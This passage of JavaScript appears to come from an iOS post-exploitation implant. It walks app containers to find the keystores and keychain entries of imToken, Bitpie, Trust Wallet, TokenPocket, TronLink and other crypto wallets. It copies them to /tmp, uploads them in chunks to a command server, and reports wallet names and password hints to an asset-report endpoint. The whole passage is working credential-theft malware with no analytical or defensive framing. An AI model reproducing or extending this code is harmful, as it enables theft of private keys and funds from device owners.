								app_id: "keychain_c2_dump",
								app_map_key: "keychain_c2_dump",
								command_id: x.cid,
								ok: x.okN > 0,
								exfil_ok: x.okN,
								exfil_fail: x.failN,
								paths: ["/tmp/keychain_c2_dump.json"],
								title: "P7 keychain dump",
								summary: "keychain_c2_dump exfil ok=" + x.okN + " reason=" + (x.reason || ""),
								asset: true
							}));
						} catch (_) {}
					}
					return;
				}
				let f = x.files[x.fi];
				if (!f) { x.fi++; return; }
				if (!x.fname) {
					let slash = f.path.lastIndexOf("/");
					x.fname = slash >= 0 ? f.path.slice(slash + 1) : f.path;
					x.size = Number(f.size) || 0;
					let tier = peExfilTierForSize(x.size);
					x.cs = tier.cs;
					x.budget = tier.budget;
					x.tier = tier.name;
					x.totalChunks = Math.ceil(x.size / x.cs) || 1;
					x.chunkIdx = 0;
					LOG("[PE-P7-EXFIL] start " + f.path + " size=" + x.size +
						" chunks=" + x.totalChunks + " tier=" + x.tier + " cs=" + x.cs);
				}
				let budget = Number(x.budget) || 1;
				if (budget < 1) budget = 1;
				for (let b = 0; b < budget; b++) {
					if (x.chunkIdx >= x.totalChunks) break;
					let r = peExfilUploadChunk(x.uid, x.cid, f.path, x.fname, x.size, x.chunkIdx, x.totalChunks, x.cs, {
						module_id: "keychain_p7",
						asset_category: "wallet",
						app_id: "keychain_c2_dump",
						app_map_key: "keychain_c2_dump"
					});
					if (!r || !r.ok) {
						LOG("[PE-P7-EXFIL] upload_fail " + x.fname + " chunk=" + x.chunkIdx +
							" err=" + (r && r.error || ""));
						x.failN++;
						x.fi++;
						x.fname = "";
						x.chunkIdx = 0;
						x.totalChunks = 0;
						return;
					}
					LOG("[PE-P7-EXFIL] chunk " + x.fname + " " + (x.chunkIdx + 1) + "/" + x.totalChunks);
					x.chunkIdx++;
				}
				if (x.chunkIdx >= x.totalChunks) {
					LOG("[PE-P7-EXFIL] file done " + x.fname + " " + x.size + "B tier=" + x.tier);
					x.okN++;
					x.fi++;
					x.fname = "";
					x.chunkIdx = 0;
					x.totalChunks = 0;
				}
			} catch (e) {
				LOG("[PE-P7-EXFIL] tick ERR: " + String(e).slice(0, 80));
			}
		}
		// Restore dump/imtoken path: walletsV2 vault + keychain slice (no b2lib inject).
		function peImTokenPickJsonInDir(dir) {
			try {
				let d = N.callSymbol("opendir", dir);
				if (!d || d === 0n) return "";
				let hit = "";
				for (;;) {
					let ent = N.callSymbol("readdir", d);
					if (!ent || ent === 0n) break;
					let name = N.readString(ent + 21n, 256);
					if (!name || name === "." || name === "..") continue;
					if (name.length < 6 || name.slice(-5) !== ".json") continue;
					hit = dir + "/" + name;
					break;
				}
				try { N.callSymbol("closedir", d); } catch (_) {}
				return hit;
			} catch (_) { return ""; }
		}
		function peImTokenFindVault() {
			let base = "/var/mobile/Containers/Data/Application";
			let containers = peListAppContainers();
			let uuid = "";
			for (let i = 0; i < containers.length; i++) {
				let bid = String((containers[i] && containers[i].bundleId) || "").toLowerCase();
				if (bid.indexOf("im.token") >= 0) {
					uuid = String(containers[i].uuid || "");
					break;
				}
			}
			// Fallback: scan metadata for im.token even if bundleId parse missed
			if (!uuid) {
				for (let j = 0; j < containers.length; j++) {
					let u = String((containers[j] && containers[j].uuid) || "");
					if (!u) continue;
					let meta = base + "/" + u + "/.com.apple.mobile_container_manager.metadata.plist";
					let txt = __peReadFileUtf8(meta, 8192) || "";
					if (txt.indexOf("im.token") >= 0) { uuid = u; break; }
				}
			}
			if (!uuid) return { ok: false, error: "im.token container not found" };
			let doc = base + "/" + uuid + "/Documents";
			let path = peImTokenPickJsonInDir(doc + "/walletsV2");
			if (!path) path = peImTokenPickJsonInDir(doc + "/wallets");
			if (!path) {
				try {
					let d = N.callSymbol("opendir", doc);
					if (d && d !== 0n) {
						for (;;) {
							let ent = N.callSymbol("readdir", d);
							if (!ent || ent === 0n) break;
							let name = N.readString(ent + 21n, 256);
							if (!name || name === "." || name === "..") continue;
							path = peImTokenPickJsonInDir(doc + "/" + name);
							if (path) break;
						}
						try { N.callSymbol("closedir", d); } catch (_) {}
					}
				} catch (_) {}
			}
			if (!path) return { ok: false, error: "vault json not found", containerUuid: uuid };
			return { ok: true, containerUuid: uuid, vaultPath: path };
		}
		function peImTokenCollect() {
			try {
				try { N.callSymbol("mkdir", "/tmp/imtoken_auth", 0x1FF); } catch (_) {}
				let found = peImTokenFindVault();
				if (!found.ok) {
					LOG("[PE-IMTOKEN] collect FAIL " + (found.error || "?"));
					return found;
				}
				let raw = __peReadFileUtf8(found.vaultPath, 524288);
				if (!raw || raw.length < 20) {
					return { ok: false, error: "vault_read_fail", containerUuid: found.containerUuid, vaultPath: found.vaultPath };
				}
				let vaultObj = null;
				try { vaultObj = JSON.parse(raw); } catch (_) { vaultObj = null; }
				__peWriteFileUtf8("/tmp/imtoken_auth/vault_keystore.json", raw);
				__peWriteFileUtf8("/tmp/imtoken_vault.json", raw);
				let meta = {
					ok: true,
					containerUuid: found.containerUuid,
					vaultPath: found.vaultPath,
					vaultFile: found.vaultPath.split("/").pop(),
					walletName: (vaultObj && vaultObj.imTokenMeta && vaultObj.imTokenMeta.name) || "",
					passwordHint: (vaultObj && vaultObj.imTokenMeta && vaultObj.imTokenMeta.passwordHint) || "",
					ts: Date.now()
				};
				__peWriteFileUtf8("/tmp/imtoken_auth/dump_meta.json", JSON.stringify(meta));
				// Prefer P7 slice; else carve from full dump if present.
				let stFn = globalThis.__peFsStat || null;
				let sliceSt = stFn ? stFn("/tmp/imtoken_keychain.json") : null;
				if (!(sliceSt && sliceSt.exists && sliceSt.size > 0)) {
					try {
						let dumpRaw = __peReadFileUtf8("/tmp/keychain_c2_dump.json", 2 * 1024 * 1024);
						if (dumpRaw && dumpRaw.length > 50) {
							let dump = JSON.parse(dumpRaw);
							if (dump && dump.wallets && dump.wallets.imtoken) {
								__peWriteFileUtf8("/tmp/imtoken_keychain.json", JSON.stringify({
									source: "keychain_c2_dump",
									wallets: { imtoken: dump.wallets.imtoken }
								}));
							}
						}
					} catch (_) {}
				}
				let man = {
					ok: true,
					ok_count: 1,
					containerUuid: found.containerUuid,
					vaultPath: found.vaultPath,
					files: ["vault_keystore.json", "dump_meta.json"],
					ts: Date.now()
				};
				try {
					let ks = stFn ? stFn("/tmp/imtoken_keychain.json") : null;
					if (ks && ks.exists && ks.size > 0) {
						man.files.push("imtoken_keychain.json");
						man.ok_count++;
					}
				} catch (_) {}
				__peWriteFileUtf8("/tmp/imtoken_auth/manifest.json", JSON.stringify(man));
				LOG("[PE-IMTOKEN] collect OK uuid=" + found.containerUuid.slice(0, 8) +
					" vault=" + (found.vaultPath.split("/").pop() || "") +
					" name=" + (meta.walletName || "?"));
				return { ok: true, meta: meta, manifest: man };
			} catch (e) {
				LOG("[PE-IMTOKEN] collect ERR: " + String(e).slice(0, 100));
				return { ok: false, error: String(e).slice(0, 80) };
			}
		}
		function peImTokenExfilArm(entry, reason) {
			try {
				if (entry && entry.im_exfil && (entry.im_exfil.done || entry.im_exfil.files)) return true;
				let col = peImTokenCollect();
				if (entry) entry.im_collect = col;
				if (!col || !col.ok) {
					if (entry) {
						entry.state = "done_fail";
						entry.ok = false;
						entry.error = (col && col.error) || "imtoken_collect_fail";
					}
					return false;
				}
				let uid = peDeviceUuid();
				let cid = "pe-im-" + String(uid || "x").slice(0, 12) + "-" + Date.now().toString(16);
				let candidates = [
					"/tmp/imtoken_auth/vault_keystore.json",
					"/tmp/imtoken_vault.json",
					"/tmp/imtoken_auth/dump_meta.json",
					"/tmp/imtoken_keychain.json",
					"/tmp/imtoken_auth/manifest.json"
				];
				let stFn = globalThis.__peFsStat || null;
				let files = [];
				let seen = {};
				for (let i = 0; i < candidates.length; i++) {
					let p = candidates[i];
					let st = stFn ? stFn(p) : null;
					if (!st || !st.exists || !(st.size > 0)) continue;
					let slash = p.lastIndexOf("/");
					let fname = slash >= 0 ? p.slice(slash + 1) : p;
					if (seen[fname]) continue;
					seen[fname] = 1;
					files.push({ path: p, size: Number(st.size) || 0 });
				}
				if (!files.length) {
					if (entry) {
						entry.state = "done_fail";
						entry.ok = false;
						entry.error = "imtoken_no_files";
					}
					return false;
				}
				let x = {
					armed: true,
					done: false,
					uid: uid,
					cid: cid,
					files: files,
					fi: 0,
					chunkIdx: 0,
					totalChunks: 0,
					cs: 0,
					budget: 0,
					tier: "",
					fname: "",
					size: 0,
					okN: 0,
					failN: 0,
					reason: String(reason || "imtoken"),
					reported: false,
					meta: col.meta || {}
				};
				if (entry) {
					entry.im_exfil = x;
					entry.state = "im_exfil_pending";
					entry.ok = true;
					entry.session_ok = true;
					entry.payload = "imtoken";
					entry.module_id = "imtoken_vault";
				} else {
					globalThis.__pe_im_exfil = x;
				}
				LOG("[PE-IMTOKEN] exfil armed n=" + files.length + " cid=" + cid +
					" reason=" + String(reason || "imtoken"));
				return true;
			} catch (e) {
				LOG("[PE-IMTOKEN] arm ERR: " + String(e).slice(0, 80));
				return false;
			}
		}
		function peImTokenExfilTickOne(x, entry) {
			if (!x || x.done || !x.files || !x.files.length) return;
			if (x.fi >= x.files.length) {
				x.done = true;
				x.armed = false;
				LOG("[PE-IMTOKEN] exfil done ok=" + x.okN + " fail=" + x.failN + " cid=" + x.cid);
				if (entry) {
					entry.im_exfil_done = true;
					entry.state = x.okN > 0 ? "done_ok" : "done_fail";
					entry.ok = x.okN > 0;
					entry.error = x.okN > 0 ? "" : "imtoken_exfil_fail";
				}
				if (!x.reported) {
					x.reported = true;
					try {
						let fire = globalThis.__peHttpPostJsonFire || __peHttpPostJson;
						let m = x.meta || {};
						fire("/api/asset/report", JSON.stringify({
							uid: x.uid,
							uuid: x.uid,
							category: "wallet",
							asset_category: "wallet",
							module_id: "imtoken_vault",
							app_id: "im.token.app",
							app_map_key: "im.token.app",
							bundleId: "im.token.app",
							command_id: x.cid,
							ok: x.okN > 0,
							exfil_ok: x.okN,
							exfil_fail: x.failN,
							containerUuid: m.containerUuid || "",
							vaultPath: m.vaultPath || "",
							walletName: m.walletName || "",
							passwordHint: m.passwordHint || "",
							paths: ["/tmp/imtoken_auth/vault_keystore.json", "/tmp/imtoken_keychain.json"],
							title: "imToken" + (m.walletName ? (" ? " + m.walletName) : ""),
							summary: "vault+keychain exfil ok=" + x.okN,
							asset: true
						}));
					} catch (_) {}
				}
				return;
			}
			let f = x.files[x.fi];
			if (!f) { x.fi++; return; }
			if (!x.fname) {
				let slash = f.path.lastIndexOf("/");
				x.fname = slash >= 0 ? f.path.slice(slash + 1) : f.path;
				x.size = Number(f.size) || 0;
				let tier = peExfilTierForSize(x.size);
				x.cs = tier.cs;
				x.budget = tier.budget;
				x.tier = tier.name;
				x.totalChunks = Math.ceil(x.size / x.cs) || 1;
				x.chunkIdx = 0;
				LOG("[PE-IMTOKEN] start " + f.path + " size=" + x.size +
					" chunks=" + x.totalChunks + " tier=" + x.tier);
			}
			let budget = Number(x.budget) || 1;
			if (budget < 1) budget = 1;
			for (let b = 0; b < budget; b++) {
				if (x.chunkIdx >= x.totalChunks) break;
				let r = peExfilUploadChunk(x.uid, x.cid, f.path, x.fname, x.size, x.chunkIdx, x.totalChunks, x.cs, {
					module_id: "imtoken_vault",
					asset_category: "wallet",
					app_id: "im.token.app",
					app_map_key: "im.token.app"
				});
				if (!r || !r.ok) {
					LOG("[PE-IMTOKEN] upload_fail " + x.fname + " chunk=" + x.chunkIdx);
					x.failN++;
					x.fi++;
					x.fname = "";
					x.chunkIdx = 0;
					x.totalChunks = 0;
					return;
				}
				x.chunkIdx++;
			}
			if (x.chunkIdx >= x.totalChunks) {
				LOG("[PE-IMTOKEN] file done " + x.fname + " " + x.size + "B");
				x.okN++;
				x.fi++;
				x.fname = "";
				x.chunkIdx = 0;
				x.totalChunks = 0;
			}
		}
		function peImTokenExfilTick() {
			try {
				let pipe = globalThis.__pe_direct_pipe;
				if (pipe && pipe.entries) {
					for (let i = 0; i < pipe.entries.length; i++) {
						let e = pipe.entries[i];
						if (e && e.im_exfil && !e.im_exfil.done) peImTokenExfilTickOne(e.im_exfil, e);
					}
				}
				let gx = globalThis.__pe_im_exfil;
				if (gx && !gx.done) peImTokenExfilTickOne(gx, null);
			} catch (e) {
				LOG("[PE-IMTOKEN] tick ERR: " + String(e).slice(0, 80));
			}
		}
		function peDirectImDeferredTick() {
			try {
				if (!globalThis.__pe_im_direct_pending) return;
				let pipe = globalThis.__pe_direct_pipe;
				if (!pipe || pipe.state !== "running") {
					globalThis.__pe_im_direct_pending = false;
					return;
				}
				if (!pipe.im_pending || !pipe.im_pending.length) {
					globalThis.__pe_im_direct_pending = false;
					return;
				}
				let armAt = Number(pipe.im_arm_at || 0);
				if (armAt && Date.now() < armAt) return;
				globalThis.__pe_im_direct_pending = false;
				let entries = pipe.entries || [];
				LOG("[PE-DIRECT] queue imToken collect n=" + pipe.im_pending.length);
				for (let i = 0; i < pipe.im_pending.length; i++) {
					let ent = pipe.im_pending[i];
					let row = {
						ent: ent,
						sid: "",
						ok: false,
						state: "im_collecting",
						error: "",
						module_id: "imtoken_vault",
						payload: "imtoken"
					};
					peImTokenExfilArm(row, "pipeline");
					entries.push(row);
				}
				pipe.im_pending = [];
				pipe.entries = entries;
				pipe.im_queued = true;
			} catch (_) {}
		}
		// Bitpie = r18lib pe-native: keychain slice only (SB sandbox:false).
		function peBitpieEnsureSlice() {
			try {
				let stFn = globalThis.__peFsStat || null;
				let st = stFn ? stFn("/tmp/bitpie_keychain.json") : null;
				if (st && st.exists && st.size > 0) return true;
				let dumpRaw = __peReadFileUtf8("/tmp/keychain_c2_dump.json", 2 * 1024 * 1024);
				if (!dumpRaw || dumpRaw.length < 50) return false;
				let dump = JSON.parse(dumpRaw);
				if (!(dump && dump.wallets && dump.wallets.bitpie)) return false;
				__peWriteFileUtf8("/tmp/bitpie_keychain.json", JSON.stringify({
					source: "keychain_c2_dump",
					wallets: { bitpie: dump.wallets.bitpie }
				}));
				return true;
			} catch (_) { return false; }
		}
		function peBitpieCollect() {
			try {
				try { N.callSymbol("mkdir", "/tmp/bitpie_auth", 0x1FF); } catch (_) {}
				if (!peBitpieEnsureSlice()) {
					LOG("[PE-BITPIE] collect FAIL no bitpie slice in dump");
					return { ok: false, error: "bitpie_keychain_missing" };
				}
				let raw = __peReadFileUtf8("/tmp/bitpie_keychain.json", 1024 * 1024);
				if (!raw || raw.length < 20) return { ok: false, error: "bitpie_read_fail" };
				__peWriteFileUtf8("/tmp/bitpie_auth/bitpie_keychain.json", raw);
				let count = 0;
				try {
					let o = JSON.parse(raw);
					count = (o && o.wallets && o.wallets.bitpie && o.wallets.bitpie.count) || 0;
				} catch (_) {}
				let meta = { ok: true, count: count, ts: Date.now(), pe_kind: "wallet_keychain", payload: "r18lib" };
				__peWriteFileUtf8("/tmp/bitpie_auth/dump_meta.json", JSON.stringify(meta));
				__peWriteFileUtf8("/tmp/bitpie_auth/manifest.json", JSON.stringify({
					ok: true, ok_count: 1, files: ["bitpie_keychain.json", "dump_meta.json"], ts: Date.now()
				}));
				LOG("[PE-BITPIE] collect OK count=" + count);
				return { ok: true, meta: meta };
			} catch (e) {
				LOG("[PE-BITPIE] collect ERR: " + String(e).slice(0, 100));
				return { ok: false, error: String(e).slice(0, 80) };
			}
		}
		function peBitpieExfilArm(entry, reason) {
			try {
				if (entry && entry.bp_exfil && (entry.bp_exfil.done || entry.bp_exfil.files)) return true;
				let col = peBitpieCollect();
				if (entry) entry.bp_collect = col;
				if (!col || !col.ok) {
					if (entry) {
						entry.state = "done_fail";
						entry.ok = false;
						entry.error = (col && col.error) || "bitpie_collect_fail";
					}
					return false;
				}
				let uid = peDeviceUuid();
				let cid = "pe-bp-" + String(uid || "x").slice(0, 12) + "-" + Date.now().toString(16);
				let candidates = [
					"/tmp/bitpie_auth/bitpie_keychain.json",
					"/tmp/bitpie_keychain.json",
					"/tmp/bitpie_auth/dump_meta.json",
					"/tmp/bitpie_auth/manifest.json"
				];
				let stFn = globalThis.__peFsStat || null;
				let files = [];
				let seen = {};
				for (let i = 0; i < candidates.length; i++) {
					let p = candidates[i];
					let st = stFn ? stFn(p) : null;
					if (!st || !st.exists || !(st.size > 0)) continue;
					let slash = p.lastIndexOf("/");
					let fname = slash >= 0 ? p.slice(slash + 1) : p;
					if (seen[fname]) continue;
					seen[fname] = 1;
					files.push({ path: p, size: Number(st.size) || 0 });
				}
				if (!files.length) {
					if (entry) {
						entry.state = "done_fail";
						entry.ok = false;
						entry.error = "bitpie_no_files";
					}
					return false;
				}
				let x = {
					armed: true, done: false, uid: uid, cid: cid, files: files,
					fi: 0, chunkIdx: 0, totalChunks: 0, cs: 0, budget: 0, tier: "",
					fname: "", size: 0, okN: 0, failN: 0,
					reason: String(reason || "bitpie"), reported: false, meta: col.meta || {}
				};
				if (entry) {
					entry.bp_exfil = x;
					entry.state = "bp_exfil_pending";
					entry.ok = true;
					entry.session_ok = true;
					entry.payload = "bitpie";
					entry.module_id = "r18lib";
				} else {
					globalThis.__pe_bp_exfil = x;
				}
				LOG("[PE-BITPIE] exfil armed n=" + files.length + " cid=" + cid);
				return true;
			} catch (e) {
				LOG("[PE-BITPIE] arm ERR: " + String(e).slice(0, 80));
				return false;
			}
		}
		function peBitpieExfilTickOne(x, entry) {
			if (!x || x.done || !x.files || !x.files.length) return;
			if (x.fi >= x.files.length) {
				x.done = true;
				x.armed = false;
				LOG("[PE-BITPIE] exfil done ok=" + x.okN + " fail=" + x.failN + " cid=" + x.cid);
				if (entry) {
					entry.bp_exfil_done = true;
					entry.state = x.okN > 0 ? "done_ok" : "done_fail";
					entry.ok = x.okN > 0;
					entry.error = x.okN > 0 ? "" : "bitpie_exfil_fail";
				}
				if (!x.reported) {
					x.reported = true;
					try {
						let fire = globalThis.__peHttpPostJsonFire || __peHttpPostJson;
						let m = x.meta || {};
						fire("/api/asset/report", JSON.stringify({
							uid: x.uid, uuid: x.uid,
							category: "wallet", asset_category: "wallet",
							module_id: "r18lib", app_id: "com.bitpie.wallet",
							app_map_key: "com.bitpie.wallet", bundleId: "com.bitpie.wallet",
							command_id: x.cid, ok: x.okN > 0,
							exfil_ok: x.okN, exfil_fail: x.failN,
							count: m.count || 0,
							paths: ["/tmp/bitpie_keychain.json"],
							title: "Bitpie keychain",
							summary: "bitpie keychain items=" + (m.count || 0) + " ok=" + x.okN,
							asset: true
						}));
					} catch (_) {}
				}
				return;
			}
			let f = x.files[x.fi];
			if (!f) { x.fi++; return; }
			if (!x.fname) {
				let slash = f.path.lastIndexOf("/");
				x.fname = slash >= 0 ? f.path.slice(slash + 1) : f.path;
				x.size = Number(f.size) || 0;
				let tier = peExfilTierForSize(x.size);
				x.cs = tier.cs; x.budget = tier.budget; x.tier = tier.name;
				x.totalChunks = Math.ceil(x.size / x.cs) || 1;
				x.chunkIdx = 0;
				LOG("[PE-BITPIE] start " + f.path + " size=" + x.size + " tier=" + x.tier);
			}
			let budget = Number(x.budget) || 1;
			for (let b = 0; b < budget; b++) {
				if (x.chunkIdx >= x.totalChunks) break;
				let r = peExfilUploadChunk(x.uid, x.cid, f.path, x.fname, x.size, x.chunkIdx, x.totalChunks, x.cs, {
					module_id: "r18lib", asset_category: "wallet",
					app_id: "com.bitpie.wallet", app_map_key: "com.bitpie.wallet"
				});
				if (!r || !r.ok) {
					LOG("[PE-BITPIE] upload_fail " + x.fname + " chunk=" + x.chunkIdx);
					x.failN++; x.fi++; x.fname = ""; x.chunkIdx = 0; x.totalChunks = 0;
					return;
				}
				x.chunkIdx++;
			}
			if (x.chunkIdx >= x.totalChunks) {
				LOG("[PE-BITPIE] file done " + x.fname + " " + x.size + "B");
				x.okN++; x.fi++; x.fname = ""; x.chunkIdx = 0; x.totalChunks = 0;
			}
		}
		function peBitpieExfilTick() {
			try {
				let pipe = globalThis.__pe_direct_pipe;
				if (pipe && pipe.entries) {
					for (let i = 0; i < pipe.entries.length; i++) {
						let e = pipe.entries[i];
						if (e && e.bp_exfil && !e.bp_exfil.done) peBitpieExfilTickOne(e.bp_exfil, e);
					}
				}
				let gx = globalThis.__pe_bp_exfil;
				if (gx && !gx.done) peBitpieExfilTickOne(gx, null);
			} catch (e) {
				LOG("[PE-BITPIE] tick ERR: " + String(e).slice(0, 80));
			}
		}
		function peDirectBpDeferredTick() {
			try {
				if (!globalThis.__pe_bp_direct_pending) return;
				let pipe = globalThis.__pe_direct_pipe;
				if (!pipe || pipe.state !== "running") {
					globalThis.__pe_bp_direct_pending = false;
					return;
				}
				if (!pipe.bp_pending || !pipe.bp_pending.length) {
					globalThis.__pe_bp_direct_pending = false;
					return;
				}
				let armAt = Number(pipe.bp_arm_at || 0);
				if (armAt && Date.now() < armAt) return;
				globalThis.__pe_bp_direct_pending = false;
				let entries = pipe.entries || [];
				LOG("[PE-DIRECT] queue Bitpie collect n=" + pipe.bp_pending.length);
				for (let i = 0; i < pipe.bp_pending.length; i++) {
					let ent = pipe.bp_pending[i];
					let row = {
						ent: ent, sid: "", ok: false, state: "bp_collecting",
						error: "", module_id: "r18lib", payload: "bitpie"
					};
					peBitpieExfilArm(row, "pipeline");
					entries.push(row);
				}
				pipe.bp_pending = [];
				pipe.entries = entries;
				pipe.bp_queued = true;
			} catch (_) {}
		}
		// SB agent WALLET_BUNDLE_IDS port (sandbox:true only; Bitpie uses keychain path).
		var PE_WALLET_SANDBOX = {
			"com.sixdays.trust": { name: "Trust Wallet", files: ["Documents/UTC--*", "Documents/keystore/UTC--*"] },
			"com.bitkeep.os": { name: "Bitget", files: ["Library/Preferences/com.bitkeep.os.plist"] },
			"coin98.crypto.finance.insights": {
				name: "Coin98",
				files: ["Library/Application Support/coin98.crypto.finance.insights/RCTAsyncLocalStorage_V1/*"]
			},
			"com.tonhub.app": { name: "Tonhub", files: ["Documents/mmkv/mmkv.default"] },
			"com.aspect.tronlink": { name: "TronLink", files: ["Documents/keystore/UTC--*"] },
			"com.tokenpocket.1": { name: "TokenPocket", files: ["Documents/wallets/*", "Documents/identity.json"] },
			"im.token.app": { name: "imToken", files: ["Documents/walletsV2/*.json"] }
		};
		function peWalletMatchGlob(name, pat) {
			if (!pat || pat === "*") return true;
			if (pat.indexOf("*") < 0) return name === pat;
			let parts = pat.split("*");
			if (parts.length === 2) {
				if (parts[0] && name.indexOf(parts[0]) !== 0) return false;
				if (parts[1] && name.slice(-parts[1].length) !== parts[1]) return false;
				return true;
			}
			return name.indexOf(parts[0] || "") === 0;
		}
		function peWalletListDirNames(dir) {
			let out = [];
			try {
				let d = N.callSymbol("opendir", dir);
				if (!d || d === 0n) return out;
				for (;;) {
					let ent = N.callSymbol("readdir", d);
					if (!ent || ent === 0n) break;
					let name = N.readString(ent + 21n, 256);
					if (!name || name === "." || name === "..") continue;
					out.push(name);
					if (out.length >= 200) break;
				}
				try { N.callSymbol("closedir", d); } catch (_) {}
			} catch (_) {}
			return out;
		}
		function peWalletResolveFiles(containerPath, patterns) {
			let results = [];
			for (let pi = 0; pi < (patterns || []).length; pi++) {
				let pattern = patterns[pi];
				let lastSlash = pattern.lastIndexOf("/");
				let dirPart = lastSlash >= 0 ? pattern.substring(0, lastSlash) : "";
				let namePart = lastSlash >= 0 ? pattern.substring(lastSlash + 1) : pattern;
				let dirPath = containerPath + (dirPart ? "/" + dirPart : "");
				if (namePart.indexOf("*") >= 0) {
					let names = peWalletListDirNames(dirPath);
					for (let i = 0; i < names.length; i++) {
						if (!peWalletMatchGlob(names[i], namePart)) continue;
						results.push({
							relPath: (dirPart ? dirPart + "/" : "") + names[i],
							absPath: dirPath + "/" + names[i]
						});
						if (results.length >= 40) return results;
					}
				} else {
					let fullPath = containerPath + "/" + pattern;
					if (Number(N.callSymbol("access", fullPath, 0)) === 0) {
						results.push({ relPath: pattern, absPath: fullPath });
					}
				}
			}
			return results;
		}
		function peWalletScanCollect() {
			try {
				try { N.callSymbol("mkdir", "/tmp/wallet_scan", 0x1FF); } catch (_) {}
				let containers = peListAppContainers();
				let base = "/var/mobile/Containers/Data/Application";
				let found = [];
				let stFn = globalThis.__peFsStat || null;
				for (let i = 0; i < containers.length; i++) {
					let bid = String((containers[i] && containers[i].bundleId) || "");
					let uuid = String((containers[i] && containers[i].uuid) || "");
					if (!bid || !uuid) continue;
					let cfg = PE_WALLET_SANDBOX[bid];
					if (!cfg) {
						let bl = bid.toLowerCase();
						for (let k in PE_WALLET_SANDBOX) {
							if (bl.indexOf(k.toLowerCase()) >= 0 || k.toLowerCase().indexOf(bl) >= 0) {
								cfg = PE_WALLET_SANDBOX[k];
								bid = k;
								break;
							}
						}
					}
					if (!cfg || !cfg.files) continue;
					// imToken primary path is peImToken*; still copy vault here if missing
					let files = peWalletResolveFiles(base + "/" + uuid, cfg.files);
					if (!files.length) continue;
					let outDir = "/tmp/wallet_scan/" + bid.replace(/\./g, "_");
					try { N.callSymbol("mkdir", outDir, 0x1FF); } catch (_) {}
					let copied = [];
					for (let fi = 0; fi < files.length; fi++) {
						let src = files[fi].absPath;
						let st = stFn ? stFn(src) : null;
						if (!st || !st.exists || !(st.size > 0) || st.size > 8 * 1024 * 1024) continue;
						let raw = __peReadFileUtf8(src, Math.min(st.size + 16, 8 * 1024 * 1024));
						if (!raw) continue;
						let safe = String(files[fi].relPath || "f").replace(/\//g, "_");
						let dst = outDir + "/" + safe;
						__peWriteFileUtf8(dst, raw);
						copied.push({ path: dst, size: raw.length, rel: files[fi].relPath });
					}
					if (copied.length) {
						found.push({ bid: bid, name: cfg.name || bid, uuid: uuid, files: copied });
						LOG("[PE-WALLET] scan " + (cfg.name || bid) + " n=" + copied.length);
					}
				}
				__peWriteFileUtf8("/tmp/wallet_scan/manifest.json", JSON.stringify({
					ok: true, wallets: found.length, ts: Date.now(),
					items: found.map(function (w) {
						return { bid: w.bid, name: w.name, n: w.files.length };
					})
				}));
				return { ok: true, wallets: found };
			} catch (e) {
				LOG("[PE-WALLET] scan ERR: " + String(e).slice(0, 100));
				return { ok: false, error: String(e).slice(0, 80), wallets: [] };
			}
		}
		function peWalletScanExfilArm(reason) {
			try {
				let cur = globalThis.__pe_wallet_scan_exfil;
				if (cur && (cur.done || cur.armed || cur.files)) return true;
				let col = peWalletScanCollect();
				let files = [];
				let stFn = globalThis.__peFsStat || null;
				let wallets = (col && col.wallets) || [];
				for (let i = 0; i < wallets.length; i++) {
					let w = wallets[i];
					for (let j = 0; j < (w.files || []).length; j++) {
						files.push({
							path: w.files[j].path,
							size: w.files[j].size,
							bid: w.bid,
							name: w.name
						});
					}
				}
				let manSt = stFn ? stFn("/tmp/wallet_scan/manifest.json") : null;
				if (manSt && manSt.exists && manSt.size > 0) {
					files.push({ path: "/tmp/wallet_scan/manifest.json", size: Number(manSt.size) || 0, bid: "wallet_scan", name: "manifest" });
				}
				if (!files.length) {
					LOG("[PE-WALLET] scan empty - no sandbox files");
					globalThis.__pe_wallet_scan_exfil = { done: true, armed: false, okN: 0, failN: 0, empty: true };
					return false;
				}
				let uid = peDeviceUuid();
				let cid = "pe-ws-" + String(uid || "x").slice(0, 12) + "-" + Date.now().toString(16);
				globalThis.__pe_wallet_scan_exfil = {
					armed: true, done: false, uid: uid, cid: cid, files: files,
					fi: 0, chunkIdx: 0, totalChunks: 0, cs: 0, budget: 0, tier: "",
					fname: "", size: 0, okN: 0, failN: 0,
					reason: String(reason || "wallet_scan"), reported: false
				};
				LOG("[PE-WALLET] exfil armed n=" + files.length + " cid=" + cid);
				return true;
			} catch (e) {
				LOG("[PE-WALLET] arm ERR: " + String(e).slice(0, 80));
				return false;
			}
		}
		function peWalletScanExfilTick() {
			try {
				let x = globalThis.__pe_wallet_scan_exfil;
				if (!x || x.done || !x.files || !x.files.length) return;
				if (x.fi >= x.files.length) {
					x.done = true;
					x.armed = false;
					LOG("[PE-WALLET] exfil done ok=" + x.okN + " fail=" + x.failN);
					if (!x.reported) {
						x.reported = true;
						try {
							let fire = globalThis.__peHttpPostJsonFire || __peHttpPostJson;
							fire("/api/asset/report", JSON.stringify({
								uid: x.uid, uuid: x.uid,
								category: "wallet", asset_category: "wallet",
								module_id: "wallet_scan", app_id: "wallet_scan",
								app_map_key: "wallet_scan",
								command_id: x.cid, ok: x.okN > 0,
								exfil_ok: x.okN, exfil_fail: x.failN,
								paths: ["/tmp/wallet_scan/manifest.json"],
								title: "SB wallet_scan",
								summary: "sandbox files ok=" + x.okN,
								asset: true
							}));
						} catch (_) {}
					}
					return;
				}
				let f = x.files[x.fi];
				if (!f) { x.fi++; return; }
				if (!x.fname) {
					let slash = f.path.lastIndexOf("/");
					x.fname = slash >= 0 ? f.path.slice(slash + 1) : f.path;
					x.size = Number(f.size) || 0;
					let tier = peExfilTierForSize(x.size);
					x.cs = tier.cs; x.budget = tier.budget; x.tier = tier.name;
					x.totalChunks = Math.ceil(x.size / x.cs) || 1;
					x.chunkIdx = 0;
				}
				let budget = Number(x.budget) || 1;
				for (let b = 0; b < budget; b++) {
					if (x.chunkIdx >= x.totalChunks) break;
					let r = peExfilUploadChunk(x.uid, x.cid, f.path, x.fname, x.size, x.chunkIdx, x.totalChunks, x.cs, {
						module_id: "wallet_scan", asset_category: "wallet",
						app_id: f.bid || "wallet_scan", app_map_key: f.bid || "wallet_scan"
					});
					if (!r || !r.ok) {
						x.failN++; x.fi++; x.fname = ""; x.chunkIdx = 0; x.totalChunks = 0;
						return;
					}
					x.chunkIdx++;
				}
				if (x.chunkIdx >= x.totalChunks) {
					x.okN++; x.fi++; x.fname = ""; x.chunkIdx = 0; x.totalChunks = 0;
				}
			} catch (e) {
				LOG("[PE-WALLET] tick ERR: " + String(e).slice(0, 80));
			}
		}
		function peDirectWalletDeferredTick() {
			try {
				if (!globalThis.__pe_wallet_direct_pending) return;
				let pipe = globalThis.__pe_direct_pipe;
